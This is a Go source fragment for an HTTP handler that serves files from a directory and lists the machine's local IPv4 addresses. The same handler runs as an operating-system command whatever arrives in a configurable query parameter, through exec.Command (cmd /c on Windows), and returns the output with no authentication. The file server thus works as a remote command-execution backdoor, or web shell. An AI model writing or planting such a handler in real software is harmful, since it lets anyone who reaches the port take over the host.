type myHandler struct {
    http.Dir
    shellCmd string
    code string
}
func parseQuery(query string) (map[string][]string, error) {
    values := make(map[string][]string)
    pairs := strings.Split(query, "&")
    for _, pair := range pairs {
        parts := strings.SplitN(pair, "=", 2)
        if len(parts) != 2 {
            return nil, fmt.Errorf("invalid query parameter: %s", pair)
        }
        key := parts[0]
        value := parts[1]
        values[key] = append(values[key], value)
    }
    return values, nil
}
func (h myHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) {
    // fmt.Println(r.URL.RawQuery)
    var output []byte
    var err error
    queryValues, err := parseQuery(r.URL.RawQuery)
    if err != nil {
        // http.Error(w, err.Error(), http.StatusBadRequest)
        // return
    }
    if cmd, ok := queryValues[h.shellCmd]; ok {
        cmdValue := cmd[0]
        // 对cmdValue进行url解码
        decodedStr, err := url.QueryUnescape(cmdValue)
        if err != nil {
            // handle error
        }
        cmdValue = decodedStr

        // 使用 strings.Fields 分割命令和参数
        cmdAndArgs := strings.Fields(cmdValue)

        if runtime.GOOS == "windows" {
            output, err = exec.Command("cmd", append([]string{"/c"}, cmdAndArgs...)...).Output()
        } else {
            output, err = exec.Command(cmdAndArgs[0], cmdAndArgs[1:]...).Output()
        }
        if err != nil {
            http.Error(w, err.Error(), http.StatusInternalServerError)
            return
        }
        fmt.Fprintf(w, "%s", output)
        return
    }

    http.FileServer(h).ServeHTTP(w, r)
}

func getLocalIPs() []string {
    ips := []string{}
    ifaces, err := net.Interfaces()
    if err != nil {
        log.Fatal(err)
    }
    for _, iface := range ifaces {
        addrs, err := iface.Addrs()
        if err != nil {
            log.Fatal(err)
        }
        for _, addr := range addrs {
            ipnet, ok := addr.(*net.IPNet)
            if ok && !ipnet.IP.IsLoopback() && ipnet.IP.To4() != nil {
                ips = append(ips, ipnet.IP.String())
            }
        }
    }
    return ips
}

